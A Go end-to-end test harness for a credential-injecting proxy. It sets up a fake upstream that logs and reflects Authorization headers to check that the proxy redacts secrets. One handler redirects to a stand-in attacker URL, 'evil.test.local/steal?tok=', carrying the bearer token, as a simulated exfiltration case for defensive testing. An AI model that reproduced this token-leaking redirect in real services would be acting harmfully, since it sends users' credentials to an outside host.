// Command credproxy-e2e is the host side of notes/credproxy/e2e.sh. It starts:
//   - a fake "public" TLS upstream serving *.test.local that logs the
//     Authorization header it receives and REFLECTS it back (body, header and
//     redirect Location) to prove response redaction;
//   - the cred-proxy for group "e2e" with a policy allowing secret "gh" only
//     for api.test.local.
//
// The guest side (curl in e2e.sh) only ever receives: the proxy address, the
// proxy CA cert + the fake public CA cert, and the placeholder KOTO_CRED_gh.
// The real secret is read from a 0600 host-only file and never written to the
// guest directory. Test-only tool: not built into the koto binary.
package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"sync"
	"syscall"

	"koto/credproxy"
)

func main() {
	dir := flag.String("dir", "", "work dir (host/, upstream/, guest/ are created under it)")
	flag.Parse()
	if *dir == "" {
		log.Fatal("-dir required")
	}
	hostDir := filepath.Join(*dir, "host")
	upDir := filepath.Join(*dir, "upstream")
	guestDir := filepath.Join(*dir, "guest")
	for _, d := range []string{hostDir, upDir, guestDir} {
		must(os.MkdirAll(d, 0o700))
	}
	secretB, err := os.ReadFile(filepath.Join(hostDir, "secret"))
	must(err)
	secret := strings.TrimSpace(string(secretB))

	// --- fake public upstream -------------------------------------------
	pubCA, err := credproxy.NewCA()
	must(err)
	var mu sync.Mutex
	recv, err := os.OpenFile(filepath.Join(upDir, "received.log"), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o600)
	must(err)
	upMux := http.NewServeMux()
	upMux.HandleFunc("/echo", func(w http.ResponseWriter, r *http.Request) {
		auth := r.Header.Get("Authorization")
		mu.Lock()
		fmt.Fprintf(recv, "host=%s path=%s auth=%s\n", r.Host, r.URL.Path, auth)
		mu.Unlock()
		w.Header().Set("X-Echo-Auth", auth) // reflection in a header
		fmt.Fprintf(w, "upstream saw Authorization: %s\n", auth)
	})
	upMux.HandleFunc("/redirect", func(w http.ResponseWriter, r *http.Request) {
		auth := r.Header.Get("Authorization")
		mu.Lock()
		fmt.Fprintf(recv, "host=%s path=%s auth=%s\n", r.Host, r.URL.Path, auth)
		mu.Unlock()
		w.Header().Set("Authorization", auth) // auth echo on a cross-host 3xx
		tok := strings.TrimPrefix(auth, "Bearer ")
		http.Redirect(w, r, "https://evil.test.local/steal?tok="+tok, http.StatusFound)
	})
	upLn, err := net.Listen("tcp", "127.0.0.1:0")
	must(err)
	upSrv := &http.Server{Handler: upMux, TLSConfig: &tls.Config{
		GetCertificate: func(hi *tls.ClientHelloInfo) (*tls.Certificate, error) {
			return pubCA.LeafFor(hi.ServerName)
		},
	}}
	go func() { _ = upSrv.ServeTLS(upLn, "", "") }()
	upAddr := upLn.Addr().String()

	// --- cred-proxy -------------------------------------------------------
	pol := &credproxy.Policy{Secrets: []credproxy.Secret{{
		Name:   "gh",
		Value:  secret,
		Groups: []string{"e2e"},
		Hosts:  []string{"api.test.local"},
		Header: "Authorization",
		Scheme: "Bearer",
	}}}
	pj, _ := json.MarshalIndent(pol, "", "  ")
	must(os.WriteFile(filepath.Join(hostDir, "policy.json"), pj, 0o600))
	ca, err := credproxy.LoadOrCreateCA(filepath.Join(hostDir, "ca"))
	must(err)

	roots := x509.NewCertPool()
	roots.AppendCertsFromPEM(pubCA.CertPEM())
	px, err := credproxy.NewProxy(pol, ca, "e2e")
	must(err)
	px.UpstreamRoots = roots
	px.Dial = func(ctx context.Context, network, addr string) (net.Conn, error) {
		h, _, _ := net.SplitHostPort(addr)
		if !strings.HasSuffix(h, ".test.local") {
			return nil, fmt.Errorf("e2e: refusing non-test dest %s", addr)
		}
		var d net.Dialer
		return d.DialContext(ctx, network, upAddr) // fake DNS: *.test.local -> upstream
	}
	auditF, err := os.OpenFile(filepath.Join(hostDir, "audit.log"), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o600)
	must(err)
	audit := log.New(auditF, "", log.LstdFlags)
	px.Logf = audit.Printf

	pxLn, err := net.Listen("tcp", "127.0.0.1:0")
	must(err)
	go func() { _ = http.Serve(pxLn, px) }()

	// --- hand the guest ONLY public material ------------------------------
	bundle := append(append([]byte{}, ca.CertPEM()...), pubCA.CertPEM()...)
	must(os.WriteFile(filepath.Join(guestDir, "ca-bundle.pem"), bundle, 0o644))
	must(os.WriteFile(filepath.Join(guestDir, "env"),
		[]byte("GH_TOKEN="+pol.Secrets[0].Placeholder()+"\nHTTPS_PROXY=http://"+pxLn.Addr().String()+"\n"), 0o644))
	// ready marker last
	must(os.WriteFile(filepath.Join(guestDir, "proxy.addr"), []byte(pxLn.Addr().String()+"\n"), 0o644))
	fmt.Println("ready proxy=" + pxLn.Addr().String() + " upstream=" + upAddr)

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGTERM, os.Interrupt)
	<-sig
}

func must(err error) {
	if err != nil {
		log.Fatal(err)
	}
}
